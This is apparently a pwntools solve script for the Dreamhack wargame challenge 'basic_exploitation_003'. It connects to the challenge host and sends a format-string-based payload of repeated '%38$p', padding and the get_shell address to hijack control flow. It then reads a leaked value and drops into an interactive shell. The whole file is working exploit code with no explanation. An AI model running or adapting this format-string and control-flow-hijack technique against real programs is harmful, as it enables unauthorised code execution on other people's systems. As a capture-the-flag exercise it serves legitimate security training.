from pwn import *

context.log_level = 'debug'
context.binary = exe = ELF('./basic_exploitation_003', checksec=False)

r = process(exe.path)
r = remote('host3.dreamhack.games', 14269)
#gdb.attach(r, gdbscript="""
#           b *main+61
#           b *main+84
#           b *main+99
#           """)
get_shell = exe.sym['get_shell']
payload = b'%38$p'*15
payload += b'A'*6
payload += p32(exe.sym['get_shell'])
r.send(payload)
log.info("get_shell: " + hex(get_shell))
r.recvuntil(b'ECHO : ')
leak = u32(r.recvn(3) + b'\x00')
log.info("Leak: " + hex(leak))
r.interactive()